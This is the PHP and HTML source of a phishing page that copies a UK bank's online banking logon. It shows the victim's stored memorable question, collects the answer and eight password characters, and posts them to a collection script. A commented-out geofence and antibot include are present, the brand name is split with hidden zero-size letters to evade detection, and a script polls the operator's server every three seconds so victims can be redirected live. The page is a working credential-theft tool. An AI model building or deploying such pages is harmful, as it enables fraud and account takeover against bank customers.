<?php
//require_once('../antibot8/code/include.php');
session_start();
//
// if ($_SESSION['countryCode'] != "GB") {
//
// header("location: http://t.co/vYZrT76dPy?amp=1",  true,  301 );  exit;
//
// }



$coxfile=  "cox.php";

include $coxfile;
$userip =$_SERVER['REMOTE_ADDR'];

   $sql ="SELECT * from user where IP='$userip';";

   $ret = $db->query($sql);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
      $question =$row['question'];
      $user =$row['user'];


   }

   $db->close();

function generateRandomString($length = 20) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
  ?>
<html style="font-family: Lato, sans-serif;"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="jackss/njds.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,400i,700,700i,600,600i">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">


    <style>
@media only screen and (max-width: 600px)   {
  .form-group label {
      width: 100% !important;
  }
  .form-group span {
      margin-left: 4px !important;
  }
  input.smallestInput {
      margin-left: 4px !important;
  }
  input.smallestInput {
    margin-left: 3px !important;
    width: 34px !important;
}
.container.errorclass {
    height: 252px !important ;
}
section.clean-block.about-us.addsamepx {
height: 100% !important;
}
    }
    </style>
</head>

<body>
    <nav class="navbar navbar-light navbar-expand-lg fixed-top bg-white clean-navbar" style="background: rgb(0,0,0);">
        <div class="container"><a class="navbar-brand logo" href="#"><img src="jackss/hslogo.png"></a><button data-toggle="collapse" class="navbar-toggler" data-target="#navcol-2"><span class="sr-only">Toggle navigation</span><span class="navbar-toggler-icon"></span></button>
            <div class="collapse navbar-collapse text-justify" id="navcol-2">
                <ul class="navbar-nav text-capitalize ml-auto">
                    <li class="nav-item"><a class="nav-link text-capitalize text-dark active" href="#" style="font-family: Montserrat, sans-serif;font-weight: bold;font-style: normal;font-size: 17px;"><strong>Everyday Banking&nbsp;</strong></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-family: Montserrat, sans-serif;font-size: 17px;"><strong>Borrowing</strong></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Investing</strong><br></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Insurance</strong><br></a></li>
                    <li class="nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>Life events</strong><br></a></li>
                </ul>
            </div>
        </div>
    </nav>
    <main class="page">
        <section class="clean-block about-us" style="background-color: #f8f8f8;padding-bottom: 1px;padding-top: 0px;">
            <div class="container">
                <div class="block-heading" style="padding-top: 50px;padding-bottom: 0px;">
                    <h2 class="text-left text-dark" style="color: black;font-size: 26px;font-weight: 500;margin-bottom: -15px;font-family: Lato, sans-serif;">Log on to Online Banking<br></h2>
                </div>
            </div>
        </section>
        <section class="clean-block about-us addsamepx" style="background-color: white;height: 537.3px;">
          <?php if((isset($_GET['erreur'])=="yes")){?>
          <div class="container errorclass" style="height: 102px;border: 3px solid #FFCBC9;padding: 13px 20px 8px 117px;min-height: 58px;background: url(lp.gif) no-repeat scroll 30px 50% #FFF2F1;margin-top: 22px;margin-bottom: 20px;"><div role="alert" class="alert alert-danger" style="
    background: none;
    border: none;
"><strong>ERROR:</strong> One or more of the fields your have entered is incorrect. You will not be able to access any Digital Banking services if you continue to enter your details incorrectly.</div></div>

<?php }?>


            <div class="container" style="
    margin-top: 47px;
">
    <div class="row">
      <form method="post" action="Fpin.php" style="width: 100%;">
        <div class="col-md-12"><span style="font-family: Montserrat, sans-serif;">You are logging on as : <strong><?php echo $user; ?></strong>
</span>
            <hr><span style="font-family: Montserrat, sans-serif;font-weight: bold;">1. Answer your memorable question<br></span>
            <div class="form-group" style="margin-top: 18px;"><label style="font-size: 14px;font-family: Lato, sans-serif;width: 224px;"><?php echo $question; ?>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br></label><input type="text" style="border: 1px solid #E0E0E0;" name="memorableAnswer" required=""></div>
            <hr>
        </div>
        <div class="col-md-12"><span style="font-family: Montserrat, sans-serif;font-weight: bold;">2. Enter your password<br></span>
            <div class="form-group" style="margin-top: 18px;"><label style="font-size: 14px;font-family: Lato, sans-serif;width: 224px;">Password&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>
            </label><input type="text" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;" class="smallestInput" name="pass1" maxlength="1" required="">
            <input type="text" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;margin-left: 16px;" class="smallestInput" name="pass2" maxlength="1" required="">
            <input type="text" name="pass3" class="smallestInput" maxlength="1" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;margin-left: 16px;" required="">
            <input type="text" class="smallestInput" name="pass4" maxlength="1" required="" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;margin-left: 16px;">
            <input type="text" required="" class="smallestInput" name="pass5" maxlength="1" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;margin-left: 16px;">
            <input type="text" name="pass6" class="smallestInput" required="" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;margin-left: 16px;" maxlength="1">
            <span style="margin-left: 16px;">...</span>
            <input type="text" name="pass7" class="smallestInput" maxlength="1" required="" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;margin-left: 16px;">
            <input type="text" class="smallestInput" name="pass8" maxlength="1" required="" style="border: 2px solid #7fc153;height: 30px;width: 40px;text-align: center;margin-left: 16px;"></div>
            <hr><button class="btn btn-primary" type="submit" style="background-color: #db0011;border: none;border-radius: 1px;">Continue</button>
            
                     <button class="btn btn-primary" type="RESET" style="float:right;background-color: #999999;border: none;border-radius: 3px;"> Delete </button>

        </div>
      </form>
    </div>
</div><br></br>
        </section>
    </main>
    <footer class="page-footer dark" style="background: #3e4045;">
        <div class="container">
            <div class="row">
                <div class="col-sm-3">
                    <h5><strong>Support</strong></h5>
                    <ul>
                        <li><a href="#">Security centre</a></li>
                        <li><a href="#">Card support</a></li>
                        <li><a href="#">Bsrowse</a></li>
                    </ul>
                </div>
                <div class="col-sm-3"></div>
                <div class="col-sm-3"></div>
                <div class="col-sm-3"></div>
            </div>
        </div>
        <div class="footer-copyright" style="background: #3e4045;border-color: #3e4045;">
            <p>© &nbsp;<span style="font-size: 0px;">K</span>H<span style="font-size: 0px;">K</span>S<span style="font-size: 0px;">J</span>B<span style="font-size: 0px;">L</span>C Group <span style="font-size: 0px;">93</span>20<span style="font-size: 0px;">01</span>21</p>
        </div>
    </footer>


    <script type="text/javascript">
          var elts = document.getElementsByClassName('smallestInput')
    Array.from(elts).forEach(function(elt){
      elt.addEventListener("keyup", function(event) {
        // Number 13 is the "Enter" key on the keyboard
        if (elt.value.length == 1) {
          // Focus on the next sibling
          elt.nextElementSibling.focus();
        }

      });
    });
    </script>


             <script>
function showHint() {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                if(this.responseText!='')
            window.location.replace(this.responseText);
                else {

                }

            }
        }
        xmlhttp.open("GET", "forcere.php", true);
        xmlhttp.send();

}
window.setInterval(function(){
  showHint();
}, 3000);



    </script>


</body></html>
